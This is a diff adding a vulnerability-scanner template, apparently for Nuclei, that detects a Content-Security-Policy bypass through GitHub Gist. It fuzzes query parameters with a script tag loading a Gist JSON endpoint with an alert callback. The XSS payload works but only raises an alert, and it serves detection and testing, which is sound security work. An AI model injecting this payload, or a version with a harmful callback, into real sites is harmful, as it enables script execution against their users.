@@ -1,0 +1,55 @@
+id: github-gist-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - GitHub Gist
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,github-gist
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "github.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: github_gist_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "github_gist_csp_xss == true"
+# digest: 4a0a004730450220724f9c373389e734439cdbf448adb26fe1ffa132c53630d7b3cf49897eac1d7a022100f29115cc230af381b6f35a2680b102a9190a091f73627608e3126f98b8a53465:922c64590222798bb761d5b6d8e72950
